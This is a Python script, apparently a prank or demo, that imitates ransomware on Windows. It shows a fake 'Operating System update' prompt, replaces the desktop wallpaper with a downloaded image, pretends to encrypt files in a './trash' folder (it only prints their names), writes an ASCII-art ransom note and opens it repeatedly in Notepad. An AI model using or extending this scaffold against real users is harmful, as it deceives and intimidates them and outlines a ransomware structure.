import ctypes
import datetime
import os
import subprocess
import time
import urllib.request

import pyautogui


def menu():
    choice = pyautogui.prompt("""
      1 - Install Operating System update.
    """)
    if choice == '1':
        print("Thank you, have fun :).")
    pyautogui.alert('Get got')
    pyautogui.confirm('Get got')
    pyautogui.countdown(5)

def background():
    imageUrl = 'https://static.wikia.nocookie.net/adventures-of-chris-and-tifa/images/8/8d/35CCC3AF-FEA3-4FFA-9382-2D63496864A7.png/revision/latest/scale-to-width-down/1000?cb=20210129062521'
    path = f'background-a.jpg'
    location, res = urllib.request.urlretrieve(imageUrl, path)
    time.sleep(.5)
    bgimage = os.path.join(os.getcwd(), location)
    print(f'LOCATION: {bgimage}')
    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, location, 0)

def encrypt_directory():
    dirname = './trash'
    for path, dirnames, files in os.walk(dirname):
        for file in files:
            filePath = os.path.join(path, file)
            print(f'Encrypting File {filePath}')

def create_note():
    date = datetime.date.today().strftime('%d-%B-Y')
    with open('RANSOM_NOTE.txt', 'w') as f:
        f.write(f''' You never saw it coming!
        

....    ....   ....    ....   ....    ....   ....    ....   ....    ....   ....    ....   ....    ....   ....    ....    
    ....    ...    ....    ...    ....    ...    ....    ...     ...    ...,%@@&&%%%&@&...    ....    ...    ....    ... 
    ....    ...    ....    ...    ....    ...    ....    ...   .@%%%%%%%%%%%%%@@@@@@@@@@@.    ....    ...    ....    ...
....    ....   ....    ....   ....    ....   ....    ...#@%%%%%%#%%%%%%%@@@@@@@@@@@@@@@@  ....    ....   ....    ....    ..
                                                   %@%%%%%%%%%%%#%%%@@%%@@&@@@@@@@@@@@@%                          
    ....    ...    ....    ...    ....    ...  #@%%%%%%%%%%%%%%%%@%%@%%%%@@@@%@@@@@@@@@...    ....    ...    ....    ..
....    ....   ....    ....   ....    ....  &%%%#%%%%%%%#%%%%%%%#%%%&%%%%&@%@%@@@@@@@@@   ....    ....   ....    ....    . 
 ...    ....    ...    ....    ...    ....%%%%%%%%%%%%%%%%%%%%%%#%%%%@%%%%@@@%%@@@@@@@%    ...    ....    ...    ....      
    ....    ...    ....    ...    ....  %%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%@&%%@@@@@@@ ...    ....    ...    ....    ..
....    ....   ....    ....   ....    @%%%%%%%%%%%%%%%@%%%%%%%%%#%%%%%@%%%%@@@%%@@@@@@.   ....    ....   ....    ....      
....    ....   ....    ....   ....   @%%%%%%%%%%#%%@@@@@@%%%%%%%#%%%%%%@%%%%@%%%@@@@@@#   ....    ....   ....    ....      
    ....    ...    ....    ...    ..*@@%%%%%%%&@@@@@@@@@@@%%%%%%#%%%%%%%&%%%@@&%@@@@@@@...    ....    ...    ....    ..
....    ....   ....    ....   ....    ..@@@@@@@@@@@@@@@@@%@&%%%%#%%%%%%%%%%%%@@%%@@@@@@   ....    ....   .... #& ....    ..
....    ....   ....    ....   ....    .... @@@@@@@@@@@@@@@%%%%%%#%%%%%%%%&%%%%@@%@@@@@@@%   ....      
    ....    ...    ....    ...    ....    ... @@@@@@@@@@@@@@#@%%#%%%#%%%#%&%%%%@@@@@@@@@@@@&%@@@@@@@@@@@@@    ..
....    ....   ....    ....   ....    ....   ...@@@@@@@@@@@@@&@%#%%%%%%%%%%%%%%@@@@@@@%%&@@@@@@@@@@@@@@@@@@@&@.      
....    ....   ....    ....   ....    ....   .... @@@@@@@@@@@@@@%%%%%%%%%%%%&@@%%@@%%@@@@@@@@@ .@@@@@@@@@@@@@@  @@@..      
    ....    ...    ....    ...    ....    ...    ..&@@@@@@@@@@@@@@%%%%%%%%%@%%%%@%@@@@@@@@@  @@@@@%%%%%%@@@@@ @@@@@@ ..
....    ....   ....    ....   ....    ....   ....    @@@@@@@@@@@@@@%%%%%@%%%%%@%@@@@@@@    @@%%%%%@%%%%%@@@  @@@@@@@.    . 
....    ....   ....    ....   ....    ....   ....    .*@@@@@@@@@@@@@@@%%%%%%@%@@@@@@@      %%%%%  @%%%%@@   @@@@@@@@.    
    ....    ...    ....    ...    ....    ...    ....  @@@@@@@@@@@%%%%%%%%%@%@@@@@@@       %%%%   @&&      @@@@@@@@@ ..
....    ....   ....    ....   ....    ....   ....    ...@@@@@@@%#%%%%%%%%%%%@@@@@%%@        ,%%          ,@@@@@@@@@..      
....    ....   ....    ....   ....    ....   ....    ....@@@@@@@%%%%%%%%%%%@@(@%%%%%         @%%%%%%@@@@@@@@@@@@@@...    ..
    ....    ...    ....    ...    ....    ...    ...@@@@@@@@@@@@@%%%%%%%%%@@ ,%%%%%.       @&%%%%%%%@@@@@@@@@@@@*    ..
....    ....   ....    ....   ....    ....   ..(@@@@@&%%%@@@@@@@@@%%%%%%%@@   (@@@        &%%%&%%%%@@@@@@@@@@    ....      
....    ....   ....    ....   ....    ....  %@@%%%%%%%%%%%%@@@@@@@%%%@%%@%#                  @%%%&@@@@@@@@(..    ....      
    ....    ...    ....    ...    ....    @@%%%%%%%%%%%%%%%%%@@@@@@@@%@%@                  @&%%%@@@@@@@,.    ....    .
....    ....   ....    ....   ....    ...*@%%%%%%%%%%%%%%%%%%%%%@@&%%@%&@@             @@%%%%%%@@@@...   ....    ....      
....    ....   ....    ....   ....    ....@%%%%%%%%%%%%%%%%%%%%%%%%@&%%%%/         @%%%%%@%%%@@   ....   ....    ....    . 
    ....    ...    ....    ...    ....    ..%%%%%%%%%%%%%%%%%&@%%@@%%%%%                @%%@@ ....    ...    ....    ..
....    ....   ....    ....   ....    ....   .#%%%%%%%%%&%%%%@@@@@%%%%%,  &@@&@     @@%%%%@...    ....   ....    ....    . 
....    ....   ....    ....   ....    ....   ....  @@@@@@@@.   /@@@@%%%%%%%%%%%%%%%%%%%&@ ....    ....   ....    ....      
    ....    ...    ....    ...    ....    ...    ....    .@@@@   @@@%%%%%%%%%%%%%%%%%@,...    ....    ...    ....    .
....    ....   ....    ....   ....    ....   ....    ....   %@@@@@@@&...   *@@%%%@@/...   ....    ....   ....    ....    . 
....    ....   ....    ....   ....    ....   ....    ....   .... @@@/...   ....    ....   ....    ....   ....    ....    ..
{date} --
''')
    f.close()

def show_note():
    ransom = subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
    count = 0
    while True:
        time.sleep(0.1)
        subprocess.Popen(['notepad.exe', 'RANSOM_NOTE.txt'])
        time.sleep(10)
        count += 1
        if count == 5:
            break

menu()
background()
encrypt_directory()
create_note()
show_note()
